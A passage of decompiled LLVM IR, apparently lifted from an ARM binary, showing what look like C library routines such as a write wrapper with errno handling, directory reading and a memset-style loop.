  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_139bc

dec_label_pc_139bc:                               ; preds = %dec_label_pc_13998, %dec_label_pc_139ac
  %v0_139bc = phi i32 [ %v3_1399c, %dec_label_pc_13998 ], [ -1, %dec_label_pc_139ac ]
  %v2_139c0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_139c0, i32* @r4, align 4
  ret i32 %v0_139bc

; uselistorder directives
  uselistorder i32 %v3_1399c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_139bc, { 1, 0 }
}

define i32 @function_139c4(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_139c4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_139c4 = load i32, i32* @r4, align 4
  store i32 %v3_139c4, i32* %stack_var_-8, align 4
  %v4_139c8 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_139c8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_139c8, -4095
  br i1 %tmp, label %dec_label_pc_139e8, label %dec_label_pc_139d8

dec_label_pc_139d8:                               ; preds = %dec_label_pc_139c4
  %v0_139d8 = call i32 @function_13c70()
  %v0_139dc = load i32, i32* %r4.global-to-local, align 4
  %v1_139dc = sub i32 0, %v0_139dc
  %v2_139e0 = inttoptr i32 %v0_139d8 to i32*
  store i32 %v1_139dc, i32* %v2_139e0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_139e8

dec_label_pc_139e8:                               ; preds = %dec_label_pc_139c4, %dec_label_pc_139d8
  %v0_139e8 = phi i32 [ %v4_139c8, %dec_label_pc_139c4 ], [ -1, %dec_label_pc_139d8 ]
  %v2_139ec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_139ec, i32* @r4, align 4
  ret i32 %v0_139e8

; uselistorder directives
  uselistorder i32 %v4_139c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_139e8, { 1, 0 }
}

define i32 @function_139f0(i32* %arg1) local_unnamed_addr {
dec_label_pc_139f0:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_139f0 = load i32, i32* @r4, align 4
  store i32 %v3_139f0, i32* %stack_var_-20, align 4
  %v6_139f0 = load i32, i32* @r5, align 4
  %v9_139f0 = load i32, i32* @r6, align 4
  %v12_139f0 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_139f8 = load i32, i32* %arg1, align 4
  store i32 %v2_139f8, i32* %r4.global-to-local, align 4
  %v2_139fc = ptrtoint i32* %stack_var_-36 to i32
  %v1_13a00 = add i32 %tmp, 24
  store i32 %v1_13a00, i32* @r6, align 4
  %v3_13a04 = icmp eq i32 %v2_139f8, -1
  store i32 %v2_139fc, i32* @r7, align 4
  store i32 %v1_13a00, i32* %r2.global-to-local, align 4
  store i32 %v2_139fc, i32* @r0, align 4
  br i1 %v3_13a04, label %dec_label_pc_13a1c, label %dec_label_pc_13a30

dec_label_pc_13a1c:                               ; preds = %dec_label_pc_139f0
  %v0_13a1c = call i32 @function_13c70()
  %v0_13a24 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13a24, i32* %r2.global-to-local, align 4
  %v2_13a28 = inttoptr i32 %v0_13a1c to i32*
  store i32 9, i32* %v2_13a28, align 4
  %v0_13a88.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13a88

dec_label_pc_13a30:                               ; preds = %dec_label_pc_139f0
  %v8_13a38 = call i32 @function_14cdc(i32 %v2_139fc, i32 ptrtoint (i32* @global_var_14cd4.595 to i32), i32 %v1_13a00, i32 85212, i32 %v3_139f0, i32 %v6_139f0, i32 %v9_139f0)
  %v1_13a48 = call i32 @function_14cd4()
  %v0_13a54 = load i32, i32* @r5, align 4
  %v1_13a54 = inttoptr i32 %v0_13a54 to i32*
  %v2_13a54 = load i32, i32* %v1_13a54, align 4
  store i32 %v2_13a54, i32* @r4, align 4
  store i32 %v2_139fc, i32* @r0, align 4
  store i32 -1, i32* %v1_13a54, align 4
  store i32 ptrtoint (i32* @global_var_13a6c.599 to i32), i32* @lr, align 4
  %v8_13a68 = call i32 @function_14cdc(i32 %v2_139fc, i32 1, i32 %v1_13a00, i32 85212, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_13a6c = load i32, i32* @r5, align 4
  %v1_13a6c = add i32 %v0_13a6c, 12
  %v2_13a6c = inttoptr i32 %v1_13a6c to i32*
  %v3_13a6c = load i32, i32* %v2_13a6c, align 4
  store i32 %v3_13a6c, i32* @r0, align 4
  %v0_13a70 = call i32 @function_142ec()
  %v0_13a74 = load i32, i32* @r5, align 4
  store i32 %v0_13a74, i32* @r0, align 4
  %v0_13a78 = call i32 @function_142ec()
  %v0_13a7c = load i32, i32* @r4, align 4
  %v1_13a80 = call i32 @function_1369c(i32 %v0_13a7c)
  store i32 %v1_13a80, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13a88

dec_label_pc_13a88:                               ; preds = %dec_label_pc_13a1c, %dec_label_pc_13a30
  %v0_13a88 = phi i32 [ %v0_13a88.pre, %dec_label_pc_13a1c ], [ %v1_13a80, %dec_label_pc_13a30 ]
  %v2_13a90 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13a90, i32* @r4, align 4
  store i32 %v6_139f0, i32* @r5, align 4
  store i32 %v9_139f0, i32* @r6, align 4
  store i32 %v12_139f0, i32* @r7, align 4
  ret i32 %v0_13a88

; uselistorder directives
  uselistorder i32 %v1_13a00, { 2, 1, 0, 3 }
  uselistorder i32 %v2_139fc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_139f0, { 1, 0 }
  uselistorder i32 %v6_139f0, { 1, 0 }
  uselistorder label %dec_label_pc_13a88, { 1, 0 }
}

define i32 @function_13aa4(i32 %arg1) local_unnamed_addr {
dec_label_pc_13aa4:
  %r5.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-108 = alloca i32, align 4
  %v3_13aa4 = load i32, i32* @r4, align 4
  %v9_13aa4 = load i32, i32* @r6, align 4
  %v12_13aa4 = load i32, i32* @r7, align 4
  %v0_13ab0 = load i32, i32* @r0, align 4
  %v2_13ab0 = inttoptr i32 %v0_13ab0 to i8*
  %v3_13ab0 = call i32 @function_137c8(i8* %v2_13ab0, i32 18432)
  store i32 %v3_13ab0, i32* @r0, align 4
  store i32 %v3_13ab0, i32* @r7, align 4
  %v1_13ab4 = icmp slt i32 %v3_13ab0, 0
  br i1 %v1_13ab4, label %.thread1, label %dec_label_pc_13ac0

.thread1:                                         ; preds = %dec_label_pc_13aa4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_13b90

dec_label_pc_13ac0:                               ; preds = %dec_label_pc_13aa4
  %v2_13aac = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_13aac, i32* @r1, align 4
  %v0_13ac4 = call i32 @function_15100()
  %v1_13ac8 = icmp slt i32 %v0_13ac4, 0
  br i1 %v1_13ac8, label %dec_label_pc_13ae8, label %dec_label_pc_13ad0

dec_label_pc_13ad0:                               ; preds = %dec_label_pc_13ac0
  %v0_13ad0 = load i32, i32* @r7, align 4
  store i32 1, i32* @r2, align 4
  %v2_13adc = call i32 @function_135ac(i32 %v0_13ad0, i32 2)
  %v1_13ae0 = icmp slt i32 %v2_13adc, 0
  br i1 %v1_13ae0, label %dec_label_pc_13ae8, label %dec_label_pc_13b08

dec_label_pc_13ae8:                               ; preds = %dec_label_pc_13ad0, %dec_label_pc_13ac0
  %v0_13ae8 = call i32 @function_13c70()
  store i32 %v0_13ae8, i32* %r5.global-to-local, align 4
  %v0_13af0 = load i32, i32* @r7, align 4
  %v1_13af4 = inttoptr i32 %v0_13ae8 to i32*
  %v2_13af4 = load i32, i32* %v1_13af4, align 4
  store i32 %v2_13af4, i32* @r4, align 4
  %v1_13af8 = call i32 @function_1369c(i32 %v0_13af0)
  store i32 0, i32* @r6, align 4
  %v0_13b00 = load i32, i32* @r4, align 4
  %v1_13b00 = load i32, i32* %r5.global-to-local, align 4
  %v2_13b00 = inttoptr i32 %v1_13b00 to i32*
  store i32 %v0_13b00, i32* %v2_13b00, align 4
  br label %dec_label_pc_13b90

dec_label_pc_13b08:                               ; preds = %dec_label_pc_13ad0
  %v1_13b0c = call i32 @function_14140(i32 48)
  store i32 %v1_13b0c, i32* @r6, align 4
  %v2_13b10 = icmp eq i32 %v1_13b0c, 0
  br i1 %v2_13b10, label %dec_label_pc_13b60, label %dec_label_pc_13b18

dec_label_pc_13b18:                               ; preds = %dec_label_pc_13b08
  store i32 0, i32* @r4, align 4
  %v2_13b1c = add i32 %v1_13b0c, 16
  %v3_13b1c = inttoptr i32 %v2_13b1c to i32*
  store i32 0, i32* %v3_13b1c, align 4
  %v2_13b24 = icmp ugt i32 %tmp, 511
  %v1_13b28 = load i32, i32* @r6, align 4
  %v2_13b28 = add i32 %v1_13b28, 20
  %v3_13b28 = inttoptr i32 %v2_13b28 to i32*
  store i32 %tmp, i32* %v3_13b28, align 4
  br i1 %v2_13b24, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_13b18
  %v2_13b30 = load i32, i32* @r6, align 4
  %v3_13b30 = add i32 %v2_13b30, 20
  %v4_13b30 = inttoptr i32 %v3_13b30 to i32*
  store i32 512, i32* %v4_13b30, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13b18, %bb
  %v0_13b34 = load i32, i32* @r7, align 4
  %v1_13b34 = load i32, i32* @r6, align 4
  %v2_13b34 = inttoptr i32 %v1_13b34 to i32*
  store i32 %v0_13b34, i32* %v2_13b34, align 4
  %v0_13b38 = load i32, i32* @r4, align 4
  %v1_13b38 = load i32, i32* @r6, align 4
  %v2_13b38 = add i32 %v1_13b38, 8
  %v3_13b38 = inttoptr i32 %v2_13b38 to i32*
  store i32 %v0_13b38, i32* %v3_13b38, align 4
  %v0_13b3c = load i32, i32* @r4, align 4
  %v1_13b3c = load i32, i32* @r6, align 4
  %v2_13b3c = add i32 %v1_13b3c, 4
  %v3_13b3c = inttoptr i32 %v2_13b3c to i32*
  store i32 %v0_13b3c, i32* %v3_13b3c, align 4
  %v0_13b44 = load i32, i32* @r6, align 4
  %v1_13b44 = add i32 %v0_13b44, 20
  %v2_13b44 = inttoptr i32 %v1_13b44 to i32*
  %v3_13b44 = load i32, i32* %v2_13b44, align 4
  %v2_13b48 = call i32 @function_14294(i32 1, i32 %v3_13b44)
  %v2_13b4c = icmp eq i32 %v2_13b48, 0
  %v1_13b50 = load i32, i32* @r6, align 4
  %v2_13b50 = add i32 %v1_13b50, 12
  %v3_13b50 = inttoptr i32 %v2_13b50 to i32*
  store i32 %v2_13b48, i32* %v3_13b50, align 4
  br i1 %v2_13b4c, label %dec_label_pc_13b58, label %dec_label_pc_13b7c

dec_label_pc_13b58:                               ; preds = %.thread
  %v0_13b58 = load i32, i32* @r6, align 4
  store i32 %v0_13b58, i32* @r0, align 4
  %v0_13b5c = call i32 @function_142ec()
  br label %dec_label_pc_13b60

dec_label_pc_13b60:                               ; preds = %dec_label_pc_13b08, %dec_label_pc_13b58
  %v0_13b60 = load i32, i32* @r7, align 4
  %v1_13b64 = call i32 @function_1369c(i32 %v0_13b60)
  %v0_13b68 = call i32 @function_13c70()
  store i32 0, i32* @r6, align 4
  %v2_13b74 = inttoptr i32 %v0_13b68 to i32*
  store i32 12, i32* %v2_13b74, align 4
  br label %dec_label_pc_13b90

dec_label_pc_13b7c:                               ; preds = %.thread
  store i32 80784, i32* @lr, align 4
  %v1_13b8c = call i32 @function_14cd4()
  br label %dec_label_pc_13b90

dec_label_pc_13b90:                               ; preds = %.thread1, %dec_label_pc_13b60, %dec_label_pc_13ae8, %dec_label_pc_13b7c
  %v0_13b90 = load i32, i32* @r6, align 4
  store i32 %v3_13aa4, i32* @r4, align 4
  store i32 %v9_13aa4, i32* @r6, align 4
  store i32 %v12_13aa4, i32* @r7, align 4
  ret i32 %v0_13b90

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_14294, { 35, 6, 36, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 1, 22, 21, 20, 19, 18, 2, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 5, 4, 3, 0 }
  uselistorder i32 512, { 0, 5, 1, 2, 8, 6, 7, 9, 3, 10, 4, 11 }
  uselistorder i32 (i32)* @function_1369c, { 26, 25, 24, 10, 41, 40, 9, 8, 39, 38, 7, 6, 32, 11, 37, 36, 35, 34, 33, 31, 30, 29, 28, 27, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_13b90, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_13b60, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_13ba0(i32* %arg1) local_unnamed_addr {
dec_label_pc_13ba0:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_13ba0 = load i32, i32* @r4, align 4
  %v6_13ba0 = load i32, i32* @r5, align 4
  %v9_13ba0 = load i32, i32* @lr, align 4
  %v1_13ba4 = add i32 %tmp, 24
  store i32 %v1_13ba4, i32* @r4, align 4
  %v2_13ba8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 85212, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v2_13ba8, i32* @r0, align 4
  store i32 %v1_13ba4, i32* %r2.global-to-local, align 4
  %v8_13bc4 = call i32 @function_14cdc(i32 %v2_13ba8, i32 ptrtoint (i32* @global_var_14cd4.595 to i32), i32 %v1_13ba4, i32 85212, i32 %v3_13ba0, i32 %v6_13ba0, i32 %v9_13ba0)
  %v0_13bc8 = load i32, i32* @r4, align 4
  store i32 %v0_13bc8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14cd4.595 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_13bd8.604 to i32), i32* @lr, align 4
  %v1_13bd4 = call i32 @function_14cd4()
  store i32 %v1_13bd4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13bd8

dec_label_pc_13bd8:                               ; preds = %dec_label_pc_13c0c, %dec_label_pc_13ba0
  %v0_13bd8 = load i32, i32* @r5, align 4
  %v1_13bd8 = add i32 %v0_13bd8, 4
  %v2_13bd8 = inttoptr i32 %v1_13bd8 to i32*
  %v3_13bd8 = load i32, i32* %v2_13bd8, align 4
  store i32 %v3_13bd8, i32* %r2.global-to-local, align 4
  %v4_13bd8 = add i32 %v0_13bd8, 8
  %v5_13bd8 = inttoptr i32 %v4_13bd8 to i32*
  %v6_13bd8 = load i32, i32* %v5_13bd8, align 4
  store i32 %v6_13bd8, i32* %r3.global-to-local, align 4
  %tmp8 = icmp ugt i32 %v6_13bd8, %v3_13bd8
  br i1 %tmp8, label %dec_label_pc_13c0c, label %dec_label_pc_13be4

dec_label_pc_13be4:                               ; preds = %dec_label_pc_13bd8
  %v1_13be4 = inttoptr i32 %v0_13bd8 to i32*
  %v2_13be4 = load i32, i32* %v1_13be4, align 4
  store i32 %v2_13be4, i32* @r0, align 4
  %v1_13be8 = add i32 %v0_13bd8, 12
  %v2_13be8 = inttoptr i32 %v1_13be8 to i32*
  %v3_13be8 = load i32, i32* %v2_13be8, align 4
  %v1_13bec = add i32 %v0_13bd8, 20
  %v2_13bec = inttoptr i32 %v1_13bec to i32*
  %v3_13bec = load i32, i32* %v2_13bec, align 4
  store i32 %v3_13bec, i32* @r2, align 4
  %v4_13bf0 = call i32 @function_15150(i32 %v2_13be4, i32 %v3_13be8, i32 %v3_13bec, i32 %v6_13bd8)
  store i32 %v4_13bf0, i32* %r0.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_13bf0, 1
  br i1 %tmp7, label %.thread, label %dec_label_pc_13c00

.thread:                                          ; preds = %dec_label_pc_13be4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_13c40

dec_label_pc_13c00:                               ; preds = %dec_label_pc_13be4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13c04 = load i32, i32* @r5, align 4
  %v2_13c04 = add i32 %v1_13c04, 4
  %v3_13c04 = inttoptr i32 %v2_13c04 to i32*
  store i32 0, i32* %v3_13c04, align 4
  %v1_13c08 = load i32, i32* @r5, align 4
  %v2_13c08 = add i32 %v1_13c08, 8
  %v3_13c08 = inttoptr i32 %v2_13c08 to i32*
  store i32 %v4_13bf0, i32* %v3_13c08, align 4
  %v0_13c0c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13c0c

dec_label_pc_13c0c:                               ; preds = %dec_label_pc_13bd8, %dec_label_pc_13c00
  %v1_13c24 = phi i32 [ %v0_13bd8, %dec_label_pc_13bd8 ], [ %v0_13c0c.pre, %dec_label_pc_13c00 ]
  %v1_13c0c = add i32 %v1_13c24, 4
  %v2_13c0c = inttoptr i32 %v1_13c0c to i32*
  %v3_13c0c = load i32, i32* %v2_13c0c, align 4
  store i32 %v3_13c0c, i32* %r2.global-to-local, align 4
  %v1_13c10 = add i32 %v1_13c24, 12
  %v2_13c10 = inttoptr i32 %v1_13c10 to i32*
  %v3_13c10 = load i32, i32* %v2_13c10, align 4
  store i32 %v3_13c10, i32* %ip.global-to-local, align 4
  %v2_13c14 = add i32 %v3_13c10, %v3_13c0c
  store i32 %v2_13c14, i32* @r4, align 4
  %v1_13c18 = add i32 %v2_13c14, 4
  %v2_13c18 = inttoptr i32 %v1_13c18 to i32*
  %v3_13c18 = load i32, i32* %v2_13c18, align 4
  %v1_13c1c = add i32 %v2_13c14, 8
  %v2_13c1c = inttoptr i32 %v1_13c1c to i8*
  %v3_13c1c = load i8, i8* %v2_13c1c, align 1
  %v4_13c1c = zext i8 %v3_13c1c to i32
  store i32 %v4_13c1c, i32* %r3.global-to-local, align 4
  %v1_13c20 = add i32 %v2_13c14, 9
  %v2_13c20 = inttoptr i32 %v1_13c20 to i8*
  %v3_13c20 = load i8, i8* %v2_13c20, align 1
  %v4_13c20 = zext i8 %v3_13c20 to i32
  store i32 %v4_13c20, i32* %r0.global-to-local, align 4
  %v2_13c24 = add i32 %v1_13c24, 16
  %v3_13c24 = inttoptr i32 %v2_13c24 to i32*
  store i32 %v3_13c18, i32* %v3_13c24, align 4
  %v0_13c28 = load i32, i32* %r2.global-to-local, align 4
  %v1_13c28 = load i32, i32* %ip.global-to-local, align 4
  %v2_13c28 = add i32 %v1_13c28, %v0_13c28
  %v3_13c28 = inttoptr i32 %v2_13c28 to i32*
  %v4_13c28 = load i32, i32* %v3_13c28, align 4
  %v0_13c2c = load i32, i32* %r3.global-to-local, align 4
  %v1_13c2c = load i32, i32* %r0.global-to-local, align 4
  %v4_13c2c = mul i32 %v1_13c2c, 256
  %v5_13c2c = or i32 %v4_13c2c, %v0_13c2c
  store i32 %v5_13c2c, i32* %r3.global-to-local, align 4
  %v2_13c30 = add i32 %v5_13c2c, %v0_13c28
  store i32 %v2_13c30, i32* @r2, align 4
  %v2_13c34 = icmp eq i32 %v4_13c28, 0
  %v1_13c38 = load i32, i32* @r5, align 4
  %v2_13c38 = add i32 %v1_13c38, 4
  %v3_13c38 = inttoptr i32 %v2_13c38 to i32*
  store i32 %v2_13c30, i32* %v3_13c38, align 4
  br i1 %v2_13c34, label %dec_label_pc_13bd8, label %dec_label_pc_13c40

dec_label_pc_13c40:                               ; preds = %dec_label_pc_13c0c, %.thread
  store i32 %v2_13ba8, i32* @r0, align 4
  store i32 85212, i32* %r3.global-to-local, align 4
  store i32 80980, i32* @lr, align 4
  %v3_13c50 = load i32, i32* @r2, align 4
  %v8_13c50 = call i32 @function_14cdc(i32 %v2_13ba8, i32 1, i32 %v3_13c50, i32 85212, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_13c54 = load i32, i32* @r4, align 4
  store i32 %v0_13c54, i32* %r0.global-to-local, align 4
  store i32 %v3_13ba0, i32* @r4, align 4
  store i32 %v6_13ba0, i32* @r5, align 4
  ret i32 %v0_13c54

; uselistorder directives
  uselistorder i32 %v1_13c24, { 0, 2, 1 }
  uselistorder i32 %v6_13bd8, { 1, 0, 2 }
  uselistorder i32 %v0_13bd8, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v2_13ba8, { 1, 0, 3, 2 }
  uselistorder i32 %v1_13ba4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 6, 1, 5, 0 }
  uselistorder label %dec_label_pc_13c0c, { 1, 0 }
}

define i32 @function_13c70() local_unnamed_addr {
dec_label_pc_13c70:
  ret i32 ptrtoint (i32* @global_var_1ecac.607 to i32)
}

define i32 @function_13c7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_13c7c:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v1_13c88 = bitcast i32* %stack_var_-20 to %tms*
  %v2_13c88 = call i32 @function_154e0(%tms* %v1_13c88)
  %v2_13c90 = load i32, i32* %stack_var_-20, align 4
  %v2_13c94 = add i32 %v2_13c90, %tmp
  %v2_13c9c = mul i32 %v2_13c94, 10000
  %v1_13ca0 = and i32 %v2_13c9c, 2147483632
  ret i32 %v1_13ca0

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_13cb0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13cb0:
  %v0_13cb0 = call i32 @function_158f0()
  ret i32 %v0_13cb0
}

define i32 @function_13cc0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13cc0:
  %v0_13cc0 = call i32 @function_158f0()
  ret i32 %v0_13cc0

; uselistorder directives
  uselistorder i32 ()* @function_158f0, { 1, 0 }
}

define i32 @function_13cd0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13cd0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_13cd4 = load i32, i32* @r2, align 4
  %v8_13cd4 = icmp eq i32 %v0_13cd4, 8
  store i1 %v8_13cd4, i1* %cpsr_z.global-to-local, align 1
  %v5_13cd8 = icmp slt i32 %v0_13cd4, 8
  br i1 %v5_13cd8, label %dec_label_pc_13d38, label %dec_label_pc_13cdc

dec_label_pc_13cdc:                               ; preds = %dec_label_pc_13cd0
  %v4_13cdc = mul i32 %arg2, 256
  %v5_13cdc = or i32 %v4_13cdc, %arg2
  %v4_13ce0 = mul i32 %v5_13cdc, 65536
  %v5_13ce0 = or i32 %v4_13ce0, %v5_13cdc
  store i32 %v5_13ce0, i32* %r1.global-to-local, align 4
  %v1_13ce457 = urem i32 %tmp, 4
  %v2_13ce458 = icmp eq i32 %v1_13ce457, 0
  store i1 %v2_13ce458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_13ce458, label %dec_label_pc_13cf4, label %bb

bb:                                               ; preds = %dec_label_pc_13cdc, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_13cdc ]
  %v3_13ce859 = phi i32 [ %v6_13ce8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_13cdc ]
  %v4_13ce8 = inttoptr i32 %v3_13ce859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_13ce8, align 1
  %v5_13ce8 = load i32, i32* %r3.global-to-local, align 4
  %v6_13ce8 = add i32 %v5_13ce8, 1
  store i32 %v6_13ce8, i32* %r3.global-to-local, align 4
  %v0_13cec.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_13cf8.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_13cec.pr, label %dec_label_pc_13cf4, label %.thread

.thread:                                          ; preds = %bb
  %v2_13cec = add i32 %v0_13cf8.pr.pre, -1
  store i32 %v2_13cec, i32* @r2, align 4
  %v1_13ce4 = urem i32 %v6_13ce8, 4
  %v2_13ce4 = icmp eq i32 %v1_13ce4, 0
  store i1 %v2_13ce4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13ce4, label %dec_label_pc_13cf4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_13ce8.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_13ce8.pre to i8
  br label %bb

dec_label_pc_13cf4:                               ; preds = %.thread, %bb, %dec_label_pc_13cdc
  %v0_13d0028 = phi i32 [ %tmp, %dec_label_pc_13cdc ], [ %v6_13ce8, %bb ], [ %v6_13ce8, %.thread ]
  %v0_13cf8.pr = phi i32 [ %v0_13cd4, %dec_label_pc_13cdc ], [ %v0_13cf8.pr.pre, %bb ], [ %v2_13cec, %.thread ]
  %v0_13cf4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13cf4, i32* %ip.global-to-local, align 4
  %v8_13cf810 = icmp eq i32 %v0_13cf8.pr, 8
  store i1 %v8_13cf810, i1* %cpsr_z.global-to-local, align 1
  %v5_13cfc11 = icmp slt i32 %v0_13cf8.pr, 8
  br i1 %v5_13cfc11, label %dec_label_pc_13d38, label %dec_label_pc_13d00.preheader

dec_label_pc_13d00.preheader:                     ; preds = %dec_label_pc_13cf4
  %v1_13d0046 = inttoptr i32 %v0_13d0028 to i32*
  store i32 %v0_13cf4, i32* %v1_13d0046, align 4
  %v3_13d0047 = add i32 %v0_13d0028, 4
  %v4_13d0048 = inttoptr i32 %v3_13d0047 to i32*
  %v5_13d0049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_13d0049, i32* %v4_13d0048, align 4
  %v6_13d0050 = add i32 %v0_13d0028, 8
  store i32 %v6_13d0050, i32* %r3.global-to-local, align 4
  %v0_13d0451 = load i32, i32* @r2, align 4
  %v1_13d0452 = add i32 %v0_13d0451, -8
  store i32 %v1_13d0452, i32* %r2.global-to-local, align 4
  %v5_13d0c53 = icmp slt i32 %v1_13d0452, 8
  br i1 %v5_13d0c53, label %dec_label_pc_13d00.dec_label_pc_13d38.loopexit_crit_edge, label %dec_label_pc_13d10

dec_label_pc_13d10:                               ; preds = %dec_label_pc_13d00.preheader, %dec_label_pc_13cf8.dec_label_pc_13d00_crit_edge
  %v6_13d0055 = phi i32 [ %v6_13d00, %dec_label_pc_13cf8.dec_label_pc_13d00_crit_edge ], [ %v6_13d0050, %dec_label_pc_13d00.preheader ]
  %v0_13d0054 = phi i32 [ %v12_13d2c, %dec_label_pc_13cf8.dec_label_pc_13d00_crit_edge ], [ %v0_13d0028, %dec_label_pc_13d00.preheader ]
  %v1_13d10 = inttoptr i32 %v6_13d0055 to i32*
  %v2_13d10 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13d10, i32* %v1_13d10, align 4
  %v3_13d10 = add i32 %v0_13d0054, 12
  %v4_13d10 = inttoptr i32 %v3_13d10 to i32*
  %v5_13d10 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_13d10, i32* %v4_13d10, align 4
  %v6_13d10 = add i32 %v0_13d0054, 16
  store i32 %v6_13d10, i32* %r3.global-to-local, align 4
  %v0_13d14 = load i32, i32* %r2.global-to-local, align 4
  %v1_13d14 = add i32 %v0_13d14, -8
  store i32 %v1_13d14, i32* %r2.global-to-local, align 4
  %v5_13d1c = icmp slt i32 %v1_13d14, 8
  br i1 %v5_13d1c, label %dec_label_pc_13d10.dec_label_pc_13d38.loopexit_crit_edge, label %dec_label_pc_13d20

dec_label_pc_13d20:                               ; preds = %dec_label_pc_13d10
  %v1_13d20 = inttoptr i32 %v6_13d10 to i32*
  %v2_13d20 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13d20, i32* %v1_13d20, align 4
  %v3_13d20 = add i32 %v0_13d0054, 20
  %v4_13d20 = inttoptr i32 %v3_13d20 to i32*
  %v5_13d20 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_13d20, i32* %v4_13d20, align 4
  %v6_13d20 = add i32 %v0_13d0054, 24
  store i32 %v6_13d20, i32* %r3.global-to-local, align 4
  %v0_13d24 = load i32, i32* %r2.global-to-local, align 4
  %v1_13d24 = add i32 %v0_13d24, -8
  store i32 %v1_13d24, i32* %r2.global-to-local, align 4
  %v5_13d2c = icmp slt i32 %v1_13d24, 8
  br i1 %v5_13d2c, label %dec_label_pc_13d20.dec_label_pc_13d38.loopexit_crit_edge, label %dec_label_pc_13cf8

dec_label_pc_13cf8:                               ; preds = %dec_label_pc_13d20
  %v7_13d2c = inttoptr i32 %v6_13d20 to i32*
  %v8_13d2c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_13d2c, i32* %v7_13d2c, align 4
  %v9_13d2c = add i32 %v0_13d0054, 28
  %v10_13d2c = inttoptr i32 %v9_13d2c to i32*
